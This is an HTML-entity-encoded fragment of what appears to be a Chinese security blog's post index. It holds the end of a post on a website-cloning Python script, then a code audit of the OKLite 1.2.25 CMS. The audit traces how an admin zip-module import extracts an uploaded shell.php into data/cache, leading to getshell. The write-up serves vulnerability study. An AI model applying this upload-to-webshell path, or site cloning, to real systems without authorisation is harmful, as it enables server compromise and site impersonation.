&#x914D;&#x5408;&#x4E4B;&#x524D;&#x7684;&#x7F51;&#x5740;&#x5904;&#x7406;&#x51FD;&#x6570;&#xFF0C;&#x5C06;&#x9875;&#x9762;&#x5730;&#x5740;&#x548C;&#x6587;&#x4EF6;&#x5730;&#x5740;&#x901A;&#x8FC7;ProcessResourcePath&#x5904;&#x7406;&#x540E;&#x5F97;&#x5230;&#x9002;&#x914D;&#x672C;&#x5730;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x5373;&#x53EF;&#x3002; &#x94FE;&#x63A5;&#x5730;&#x5740;&#x66FF;&#x6362; &#x4E0D;&#x6B62;&#x662F;css&#x3001;js&#x3001;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5904;&#x7406;&#x597D;&#x76F8;&#x5BF9;&#x4F4D;&#x7F6E;&#xFF0C;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x4E5F;&#x9700;&#x8981;&#x5904;&#x7406;&#x91CC;&#x9762;&#x7684;&#x5404;&#x4E2A;&#x94FE;&#x63A5;&#x3002;&#x8FD9;&#x6837;&#x5728;&#x672C;&#x5730;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x5404;&#x4E2A;&#x9875;&#x9762;&#x6B63;&#x5E38;&#x5207;&#x6362;&#x3002; &#x56E0;&#x4E3A;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x9875;&#x9762;&#x662F;&#x52A8;&#x6001;&#x751F;&#x6210;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x7F51;&#x9875;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x540E;&#xFF0C;&#x90FD;&#x5E94;&#x8BE5;&#x4FEE;&#x6539;&#x4E3A;.html&#x7ED3;&#x5C3E;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x6709;&#x8FD9;&#x51E0;&#x79CD;&#x60C5;&#x51B5;&#xFF1A; &#x4EE5;.html&#x7ED3;&#x5C3E;&#x7684; =&gt; &#x76F4;&#x63A5;&#x4EE5;&#x539F;&#x6587;&#x4EF6;&#x540D;&#x4FDD;&#x5B58; &#x4EE5;.php&#x7B49;&#x4E0D;&#x9002;.html&#x7ED3;&#x5C3E;&#x7684; =&gt; &#x5728;&#x539F;&#x6765;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x540E;&#x6DFB;&#x52A0;.html&#x540E;&#x7F00;&#x4FDD;&#x5B58; &#x6CA1;&#x6709;&#x6587;&#x4EF6;&#x540D;&#x7684; =&gt; &#x4FDD;&#x5B58;&#x4E3A;index.html &#x5728;&#x4FDD;&#x5B58;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x8FD9;&#x6837;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5728;&#x94FE;&#x63A5;&#x5730;&#x5740;&#x66FF;&#x6362;&#x7684;&#x65F6;&#x5019;&#x5BF9;a&#x6807;&#x7B7E;&#x5185;&#x7684;&#x5730;&#x5740;&#x4E5F;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x8FD9;&#x6837;&#x7684;&#x5904;&#x7406;&#x5C31;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x5404;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x5730;&#x5740;&#x4E4B;&#x95F4;&#x7684;&#x6B63;&#x5E38;&#x4EA4;&#x4E92;&#x4E86;&#x3002;(&#x5BF9;&#x94FE;&#x63A5;&#x7684;&#x5904;&#x7406;&#x4EC5;&#x9650;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x5B50;&#x57DF;&#x540D;) &#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x7684;&#x603B;&#x7ED3;&#x4FDD;&#x5B58;&#x5E76;&#x5904;&#x7406;&#x4E00;&#x4E2A;&#x7F51;&#x9875;&#xFF0C;&#x5C31;&#x662F;&#x8981;&#x4FDD;&#x8BC1;css&#x3001;js&#x3001;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#x80FD;&#x591F;&#x6B63;&#x5E38;&#x8C03;&#x7528;&#x4E0E;&#x663E;&#x793A;&#x3002;&#x5E76;&#x4E14;&#x94FE;&#x63A5;&#x80FD;&#x591F;&#x4E0E;&#x591A;&#x4E2A;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x3002; &#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x7684;&#x6240;&#x6709;&#x9875;&#x9762;&#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x7684;&#x6240;&#x6709;&#x9875;&#x9762;&#x7684;&#x94FE;&#x63A5;&#x901A;&#x8FC7;&#x524D;&#x9762;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x8F83;&#x597D;&#x7684;&#x5904;&#x7406;&#x91CC;&#x9762;&#x7684;&#x94FE;&#x63A5;&#x5173;&#x7CFB;&#x3002;&#x90A3;&#x8BE5;&#x600E;&#x4E48;&#x83B7;&#x53D6;&#x5F97;&#x5230;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x7684;&#x6240;&#x6709;&#x9875;&#x9762;&#x5462;&#xFF1F; &#x975E;&#x5E38;&#x7684;&#x7B80;&#x5355;&#x7C97;&#x66B4;&#xFF0C;&#x5C31;&#x662F;&#x904D;&#x5386;&#x6240;&#x6709;&#x94FE;&#x63A5;&#xFF01;(&#x4E5F;&#x6CA1;&#x60F3;&#x5230;&#x5176;&#x4ED6;&#x597D;&#x7684;&#x65B9;&#x5F0F;&#x4E86;) &#x904D;&#x5386;&#x7F51;&#x9875;url&#x6D41;&#x7A0B;&#x56FE;&#xFF1A; &#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x65B9;&#x5F0F;&#x628A;&#x7F51;&#x7AD9;&#x6240;&#x6709;&#x7684;url&#x83B7;&#x53D6;&#x5230;&#xFF0C;&#x7136;&#x540E;&#x6279;&#x91CF;&#x8FDB;&#x884C;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x4FDD;&#x5B58;&#x5373;&#x53EF;&#x3002; &#x52A0;&#x5FEB;&#x83B7;&#x53D6;&#x94FE;&#x63A5;&#x4E0E;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x7684;&#x901F;&#x5EA6;&#x4E3A;&#x4E86;&#x52A0;&#x5FEB;&#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x6240;&#x6709;&#x9875;&#x9762;&#x7684;&#x94FE;&#x63A5;&#x548C;&#x4FDD;&#x5B58;&#x6BCF;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x591A;&#x7EBF;&#x7A0B;&#x548C;&#x534F;&#x7A0B;&#x6765;&#x52A0;&#x5FEB;&#x6267;&#x884C;&#x6548;&#x7387;&#x3002; &#x6211;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x534F;&#x7A0B;&#x6846;&#x67B6;&#xFF1A; &#x534F;&#x7A0B;&#x521D;&#x4F53;&#x9A8C;&#x4E4B;&#x7B80;&#x5355;&#x7684;&#x5229;&#x7528;&#x6846;&#x67B6; &#x8FD9;&#x4E2A;&#x6846;&#x67B6;&#x7684;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A; &#x6846;&#x67B6;&#x5199;&#x7684;&#x6BD4;&#x8F83;&#x7B80;&#x964B;&#xFF0C;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#x662F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;&#x5230;&#x590D;&#x5236;&#x7F51;&#x7AD9;&#x811A;&#x672C;&#x91CC;&#x9762;&#x7684;&#x3002;&#x5177;&#x4F53;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x8FDB;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x7EC6;&#x770B;&#x3002; &#x901A;&#x8FC7;&#x534F;&#x7A0B;&#xFF0C;&#x53EF;&#x4EE5;&#x663E;&#x8457;&#x52A0;&#x5FEB;&#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x6240;&#x6709;&#x9875;&#x9762;&#x4E0E;&#x4FDD;&#x5B58;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x901F;&#x5EA6;&#x3002; &#x603B;&#x7ED3;Github&#x9879;&#x76EE;&#x6587;&#x7AE0;&#x4E2D;&#x5404;&#x4E2A;&#x90E8;&#x5206;&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#x90FD;&#x5728;&#x4E00;&#x4E2A;python&#x811A;&#x672C;&#x5F53;&#x4E2D;&#xFF0C;github&#x4ED3;&#x5E93;&#x5730;&#x5740;&#x5982;&#x4E0B;&#xFF1A; SiteCopy: https://github.com/Threezh1/SiteCopy &#x4F7F;&#x7528;&#x547D;&#x4EE4;&#xFF1A; &#x590D;&#x5236;&#x5355;&#x4E2A;&#x9875;&#x9762;&#xFF1A; python sitecopy.py -u &quot;https://threezh1.com&quot; &#x590D;&#x5236;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;(-t&#x8BBE;&#x7F6E;&#x7EBF;&#x7A0B;)&#xFF1A; python sitecopy.py -u &quot;https://threezh1.com&quot; -e -t 30 &#x58F0;&#x660E;&#xFF1A; &#x5BF9;&#x4E92;&#x8054;&#x7F51;&#x4EFB;&#x4F55;&#x7F51;&#x7AD9;&#x7684;&#x590D;&#x5236;&#x9700;&#x5728;&#x53D6;&#x5F97;&#x6388;&#x6743;&#x540E;&#x65B9;&#x53EF;&#x8FDB;&#x884C;&#xFF0C;&#x82E5;&#x4F7F;&#x7528;&#x8005;&#x56E0;&#x6B64;&#x505A;&#x51FA;&#x5371;&#x5BB3;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x7684;&#x884C;&#x4E3A;&#x540E;&#x679C;&#x81EA;&#x8D1F;&#xFF0C;&#x4E0E;&#x4F5C;&#x8005;&#x65E0;&#x5173;&#xFF0C;&#x7279;&#x6B64;&#x58F0;&#x660E;&#x3002; &#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898; &#x76EE;&#x5F55;&#x66FF;&#x6362;&#x65F6;&#x5728;&#x6709;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x66FF;&#x6362;&#x5BFC;&#x81F4;&#x9875;&#x9762;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x663E;&#x793A; &#x7F51;&#x7AD9;&#x6216;&#x56FE;&#x5E8A;&#x6709;&#x9632;&#x722C;&#x63AA;&#x65BD;&#x65F6;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x4FDD;&#x5B58; &#x7F51;&#x7EDC;&#x95EE;&#x9898;&#x5BFC;&#x81F4;&#x811A;&#x672C;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x6267;&#x884C; &#x975E;&#x5E38;&#x5E0C;&#x671B;&#x80FD;&#x591F;&#x548C;&#x5E08;&#x5085;&#x4EEC;&#x5171;&#x540C;&#x4EA4;&#x6D41;&#x5BF9;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x5F0F;&#xFF0C;&#x6211;&#x7684;&#x90AE;&#x7BB1;&#xFF1A;makefoxm@qq.com &#x590D;&#x5236;&#x7F51;&#x7AD9;&#x6D4B;&#x8BD5; &#x590D;&#x5236;&#x81EA;&#x5DF1;&#x7684;&#x535A;&#x5BA2;&#xFF1A;https://threezh1.com &#x82B1;&#x8D39;&#x65F6;&#x95F4;&#xFF1A;2&#x5206;&#x949F;48&#x79D2; &#x8FD0;&#x884C;&#x622A;&#x56FE;&#xFF1A; &#x76EE;&#x5F55;&#x622A;&#x56FE;&#xFF1A; &#x9875;&#x9762;&#x622A;&#x56FE;&#xFF1A;","link":"/2019/12/18/论如何优雅的复制一个网站的所有页面/"},{"title":"OKLite 1.2.25 几处getshell审计分析","text":"OKLite&#x4ECB;&#x7ECD;OKLite&#x662F;&#x4E00;&#x5957;&#x6781;&#x7B80;&#x4F01;&#x4E1A;&#x7AD9;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E3B;&#x8981;&#x76EE;&#x6807;&#x7FA4;&#x4F53;&#x662F;&#x5C55;&#x793A;&#x578B;&#x4F01;&#x4E1A;&#x7F51;&#x7AD9;&#x7528;&#x6237;&#xFF0C;&#x8BA9;&#x4F20;&#x7EDF;&#x5C0F;&#x4F01;&#x4E1A;&#x5FEB;&#x901F;&#x5E03;&#x7F72;&#x7F51;&#x7AD9;&#xFF0C;&#x52A0;&#x5F3A;&#x81EA;&#x8EAB;&#x54C1;&#x724C;&#x610F;&#x8BC6;&#xFF0C;&#x5B9E;&#x73B0;&#x5BF9;&#x516C;&#x53F8;&#x5F62;&#x8C61;&#x7684;&#x5BA3;&#x4F20;&#x3002;&#x672C;&#x7CFB;&#x7EDF;&#x6700;&#x521D;&#x662F;PHPOK&#x7A0B;&#x5E8F;&#x7CBE;&#x7B80;&#x800C;&#x6765;&#x3002;&#x5728;&#x540C;&#x7B49;&#x914D;&#x7F6E;&#x4E0B;&#xFF0C;OKLite&#x901F;&#x5EA6;&#x4F18;&#x4E8E;PHPOK&#x8FBE;30%&#x4EE5;&#x4E0A;&#x3002; (&#x6B64;&#x7248;&#x672C;&#x5728;2018&#x5E74;&#x5DF2;&#x505C;&#x6B62;&#x7EF4;&#x62A4;) &#x7CFB;&#x7EDF;&#x94FE;&#x63A5;&#xFF1A;https://www.phpok.com/oklite.html &#x57FA;&#x672C;&#x60C5;&#x51B5;&#x8DEF;&#x7531;&#x7F51;&#x7AD9;&#x6709;&#x4E09;&#x4E2A;&#x5165;&#x53E3;&#xFF08;&#x524D;&#x7AEF;&#xFF0C;&#x63A5;&#x53E3;&#xFF0C;&#x540E;&#x53F0;&#xFF09;,&#x90FD;&#x662F;&#x901A;&#x8FC7;action()&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#x3002; &#x4E0D;&#x540C;&#x7684;&#x5165;&#x53E3;&#x4F20;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x65B9;&#x6CD5;&#x4E2D;&#x6267;&#x884C;&#x52A8;&#x4F5C;&#xFF1A; &#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/admin.php?c=upload&amp;f=save &#x4F1A;&#x8C03;&#x7528;framework\\admin\\upload_control.php&#x4E2D;&#x7684;save_f&#x65B9;&#x6CD5;&#x3002; &#x8FC7;&#x6EE4;&#x83B7;&#x53D6;GET, POST&#x548C;COOKIE&#x6570;&#x636E;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;get()&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x5904;&#x7406;&#xFF1A; 12345678910111213141516171819202122232425262728293031323334final public function get($id,$type=&quot;safe&quot;,$ext=&quot;&quot;){ $val = isset($_POST[$id]) ? $_POST[$id] : (isset($_GET[$id]) ? $_GET[$id] : (isset($_COOKIE[$id]) ? $_COOKIE[$id] : &apos;&apos;)); if($val == &apos;&apos;){ if($type == &apos;int&apos; || $type == &apos;intval&apos; || $type == &apos;float&apos; || $type == &apos;floatval&apos;){ return 0; }else{ return &apos;&apos;; } } //&#x5224;&#x65AD;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x6709;&#x8F6C;&#x4E49;&#xFF0C;&#x6240;&#x6709;&#x672A;&#x8F6C;&#x4E49;&#x7684;&#x6570;&#x636E;&#x90FD;&#x76F4;&#x63A5;&#x8F6C;&#x4E49; $addslashes = false; if(function_exists(&quot;get_magic_quotes_gpc&quot;) &amp;&amp; get_magic_quotes_gpc()){ $addslashes = true; } if(!$addslashes){ $val = $this-&gt;_addslashes($val); } return $this-&gt;format($val,$type,$ext);}//...&#x7701;&#x7565;private function _addslashes($val){ if(is_array($val)){ foreach($val AS $key=&gt;$value){ $val[$key] = $this-&gt;_addslashes($value); } }else{ $val = addslashes($val); } return $val;} &#x9664;&#x4E86;&#x5BF9;&#x6BCF;&#x4E2A;&#x5185;&#x5BB9;&#x90FD;&#x8FDB;&#x884C;&#x4E86;addslashes()&#x5904;&#x7406;&#xFF0C;get()&#x65B9;&#x6CD5;&#x6700;&#x540E;&#x8FD8;&#x4F1A;&#x8C03;&#x7528;$this-&gt;format()&#x3002;&#x5BF9;\\ &apos; &quot; &lt; &gt;&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x5B9E;&#x4F53;&#x5316;&#x3002; 12345678910111213141516171819202122232425262728293031323334353637383940final public function format($msg,$type=&quot;safe&quot;,$ext=&quot;&quot;){ if($msg == &quot;&quot;){ return &apos;&apos;; } if(is_array($msg)){ foreach($msg AS $key=&gt;$value){ if(!is_numeric($key)){ $key2 = $this-&gt;format($key); if($key2 == &apos;&apos; || in_array($key2,array(&apos;#&apos;,&apos;&amp;&apos;,&apos;%&apos;))){ unset($msg[$key]); continue; } } $msg[$key] = $this-&gt;format($value,$type,$ext); } if($msg &amp;&amp; count($msg)&gt;0){ return $msg; } return false; } if($type == &apos;html_js&apos; || ($type == &apos;html&apos; &amp;&amp; $ext)){ $msg = stripslashes($msg); if($this-&gt;app_id != &apos;admin&apos;){ $msg = $this-&gt;lib(&apos;string&apos;)-&gt;xss_clean($msg); } $msg = $this-&gt;lib(&apos;string&apos;)-&gt;clear_url($msg,$this-&gt;url); return addslashes($msg); } $msg = stripslashes($msg); //&#x683C;&#x5F0F;&#x5316;&#x5904;&#x7406;&#x5185;&#x5BB9; switch ($type){ case &apos;safe&apos;:$msg = str_replace(array(&quot;\\\\&quot;,&quot;&apos;&quot;,&apos;&quot;&apos;,&quot;&lt;&quot;,&quot;&gt;&quot;),array(&quot;&amp;#92;&quot;,&quot;&amp;#39;&quot;,&quot;&amp;quot;&quot;,&quot;&amp;lt;&quot;,&quot;&amp;gt;&quot;),$msg);break; //...&#x7701;&#x7565; } if($msg){ $msg = addslashes($msg); } return $msg;} &#x57FA;&#x672C;&#x4E0A;&#xFF0C;&#x4F7F;&#x7528;get()&#x83B7;&#x53D6;&#x6570;&#x636E;&#x7684;&#x70B9;&#xFF0C;&#x90FD;&#x5F88;&#x96BE;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x4E86;&#x3002; &#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x5BFC;&#x81F4;getshell(&#x540E;&#x53F0;)module_control.php&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;&#x5728;&#x6A21;&#x5757;&#x7BA1;&#x7406;&#x7BA1;&#x7406;&#x5904;&#x5BFC;&#x5165;&#x6A21;&#x5757;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x80FD;&#x4E0A;&#x4F20;zip&#x6587;&#x4EF6;&#x3002;&#x628A;&#x6076;&#x610F;&#x6587;&#x4EF6;&#x653E;&#x5728;zip&#x538B;&#x7F29;&#x5305;&#x4E2D;&#x4E0A;&#x4F20;&#xFF1A; (&#x6211;&#x8FD9;&#x91CC;&#x662F;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x4E2A;shell.php&#xFF0C;&#x5185;&#x5BB9;&#x662F;phpinfo) &#x4E0A;&#x4F20;&#x540E;&#x53C8;&#x8BBF;&#x95EE;&#x4E86;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF1A; &#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x5728;data\\cache&#x770B;&#x5230;shell.php&#x88AB;&#x89E3;&#x538B;&#x51FA;&#x6765;&#x4E86;&#x3002; &#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x6839;&#x636E;&#x4E0A;&#x4F20;&#x65F6;&#x7684;&#x5730;&#x5740;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x5904;&#x7406;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x5730;&#x5740;&#x4E0E;&#x5177;&#x4F53;&#x7684;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#xFF1A; http://localhost/admin.php?c=upload&amp;f=zip&amp;PHPSESSION=s07fke8ifd03o50tqopdhjaof2&amp;id=WU_FILE_0&amp;name=zip.zip&amp;type=application%2Fx-zip-compressed&amp;lastModifiedDate=2019%2F10%2F4+%E4%B8%8B%E5%8D%8811%3A21%3A31&amp;size=299 &#x6F0F;&#x6D1E;&#x5B58;&#x5728;&#x6587;&#x4EF6;&#xFF1A;framework\\admin\\upload_control.php &#x63A5;&#x53D7;zip&#x5305;&#x7684;&#x65B9;&#x6CD5;&#xFF1A; 12345678public function zip_f(){ $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;zipfile(&apos;upfile&apos;); if($rs[&apos;status&apos;] != &apos;ok&apos;){ $this-&gt;json($rs[&apos;error&apos;]); } $this-&gt;json($rs[&apos;filename&apos;],true);} &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;zipfile&#x65B9;&#x6CD5;&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8E2A;&#x5230;framework\\libs\\upload.php&#x4E2D;&#xFF1A; 123456789101112131415161718192021222324public function zipfile($input,$folder=&apos;&apos;){ if(!$input){ return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;&#x672A;&#x6307;&#x5B9A;&#x8868;&#x5355;&#x540D;&#x79F0;&apos;)); } //&#x5982;&#x679C;&#x672A;&#x6307;&#x5B9A;&#x5B58;&#x50A8;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5219;&#x4F7F;&#x7528; if(!$folder){ $folder = &apos;data/cache/&apos;; } $this-&gt;cateid = 0; $this-&gt;set_dir($folder); $this-&gt;set_type(&apos;zip&apos;); $this-&gt;cate = array(&apos;id&apos;=&gt;0,&apos;filemax&apos;=&gt;104857600,&apos;root&apos;=&gt;$folder,&apos;folder&apos;=&gt;&apos;/&apos;,&apos;filetypes&apos;=&gt;&apos;zip&apos;); if(isset($_FILES[$input])){ $rs = $this-&gt;_upload($input); }else{ $rs = $this-&gt;_save($input); } if($rs[&apos;status&apos;] != &apos;ok&apos;){ return $rs; } $rs[&apos;cate&apos;] = $this-&gt;cate; return $rs;} &#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x9ED8;&#x8BA4;&#x653E;&#x7F6E;&#x7684;&#x4F4D;&#x7F6E;&#x662F;data/cache/&#x4E2D;&#x3002; $_FILES[&apos;upload&apos;]&#x5C31;&#x662F;&#x4E0A;&#x4F20;&#x7684;zip&#x6587;&#x4EF6;&#x6D41;&#xFF0C;&#x63A5;&#x7740;&#x5C31;&#x4F1A;&#x8C03;&#x7528;_upload()&#x65B9;&#x6CD5;&#xFF1A; _upload()&#x662F;&#x4E00;&#x4E2A;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7247;&#x6BB5;&#x592A;&#x957F;&#x5C31;&#x4E0D;&#x653E;&#x4E86;&#x3002;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x7684;&#x662F;&#x5199;&#x5165;zip&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#x4E2D;&#x6CA1;&#x6709;&#x5BF9;zip&#x4E2D;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#x7684;&#x3002; &#x63A5;&#x7740;&#x6765;&#x770B;&#x4E0A;&#x4F20;&#x540E;&#x8BBF;&#x95EE;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF1A; http://localhost/admin.php?c=module&amp;f=import&amp;zipfile=data/cache/6b28519d80b080f3.zip&amp;_noCache=0.5889889215501739&amp;_=1570204017508 &#x7531;&#x5730;&#x5740;&#x53EF;&#x77E5;&#xFF0C;&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF1A;framework\\admin\\module_control.php&#xFF0C;&#x65B9;&#x6CD5;&#x540D;&#xFF1A;import_r 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public function import_f() { $zipfile = $this-&gt;get(&apos;zipfile&apos;); if(!$zipfile){ $this-&gt;lib(&apos;form&apos;)-&gt;cssjs(array(&apos;form_type&apos;=&gt;&apos;upload&apos;)); $this-&gt;addjs(&apos;js/webuploader/admin.upload.js&apos;); $this-&gt;view(&apos;module_import&apos;); } if(strpos($zipfile,&apos;..&apos;) !== false){ $this-&gt;json(P_Lang(&apos;&#x4E0D;&#x652F;&#x6301;&#x5E26;..&#x4E0A;&#x7EA7;&#x8DEF;&#x5F84;&apos;)); } if(!file_exists($this-&gt;dir_root.$zipfile)){ $this-&gt;json(P_Lang(&apos;ZIP&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&apos;)); } $this-&gt;lib(&apos;phpzip&apos;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&apos;data/cache/&apos;); if(!file_exists($this-&gt;dir_root.&apos;data/cache/module.xml&apos;)){ $this-&gt;json(P_Lang(&apos;&#x5BFC;&#x5165;&#x6A21;&#x5757;&#x5931;&#x8D25;&#xFF0C;&#x8BF7;&#x68C0;&#x67E5;&#x89E3;&#x538B;&#x7F29;&#x662F;&#x5426;&#x6210;&#x529F;&apos;)); } $rs = $info = $this-&gt;lib(&apos;xml&apos;)-&gt;read($this-&gt;dir_root.&apos;data/cache/module.xml&apos;,true); if(!$rs){ $this-&gt;json(P_Lang(&apos;XML&#x5185;&#x5BB9;&#x89E3;&#x6790;&#x5F02;&#x5E38;&apos;)); } $tmp = $rs; if(isset($tmp[&apos;_fields&apos;])){ unset($tmp[&apos;_fields&apos;]); } $insert_id = $this-&gt;model(&apos;module&apos;)-&gt;save($tmp); if(!$insert_id){ $this-&gt;json(P_Lang(&apos;&#x6A21;&#x5757;&#x5BFC;&#x5165;&#x5931;&#x8D25;&#xFF0C;&#x4FDD;&#x5B58;&#x6A21;&#x5757;&#x57FA;&#x672C;&#x4FE1;&#x606F;&#x9519;&#x8BEF;&apos;)); } $this-&gt;model(&apos;module&apos;)-&gt;create_tbl($insert_id); $tbl_exists = $this-&gt;model(&apos;module&apos;)-&gt;chk_tbl_exists($insert_id); if(!$tbl_exists){ $this-&gt;model(&apos;module&apos;)-&gt;delete($insert_id); $this-&gt;json(P_Lang(&apos;&#x521B;&#x5EFA;&#x6A21;&#x5757;&#x8868;&#x5931;&#x8D25;&apos;)); } if(isset($rs[&apos;_fields&apos;]) &amp;&amp; $rs[&apos;_fields&apos;]){ foreach($rs[&apos;_fields&apos;] as $key=&gt;$value){ if($value[&apos;ext&apos;] &amp;&amp; is_array($value[&apos;ext&apos;])){ $value[&apos;ext&apos;] = serialize($value[&apos;ext&apos;]); } $value[&apos;module_id&apos;] = $insert_id; $this-&gt;model(&apos;module&apos;)-&gt;fields_save($value); $this-&gt;model(&apos;module&apos;)-&gt;create_fields($insert_id,$value); } } $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/module.xml&apos;); $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$zipfile); $this-&gt;json(true); } &#x8FD9;&#x91CC;&#x4F7F;&#x7528;$this-&gt;get(&apos;zipfile&apos;)&#x83B7;&#x53D6;&#x521A;&#x521A;&#x4E0A;&#x4F20;&#x7684;zip&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4F7F;&#x7528;$this-&gt;lib(&apos;phpzip&apos;)-&gt;unzip&#x8FDB;&#x884C;&#x89E3;&#x538B;&#x3002; &#x7EE7;&#x7EED;&#x8DDF;&#x8E2A;&#xFF1A; 12345678910111213141516171819202122232425262728public function unzip($file,$to=&apos;&apos;){ if(class_exists(&apos;ZipArchive&apos;)){ $zip = new ZipArchive; $zip-&gt;open($file); $zip-&gt;extractTo($to); $zip-&gt;close(); return true; } if(function_exists(&apos;zip_open&apos;) &amp;&amp; function_exists(&apos;zip_close&apos;)){ $zip = zip_open($file); if($zip){ while ($zip_entry = zip_read($zip)) { $file = basename(zip_entry_name($zip_entry)); $fp = fopen($to.basename($file), &quot;w+&quot;); if (zip_entry_open($zip, $zip_entry, &quot;r&quot;)) { $buf = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry)); zip_entry_close($zip_entry); } fwrite($fp, $buf); fclose($fp); } zip_close($zip); return true; } } return $this-&gt;Extract($file,$to);} &#x53EF;&#x89C1;&#x4E5F;&#x6CA1;&#x6709;&#x5BF9;&#x5176;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#xFF0C;&#x76F4;&#x63A5;&#x5C31;&#x5C06;&#x5176;&#x89E3;&#x538B;&#x5E76;&#x5199;&#x5165;&#x4E86;&#x3002; 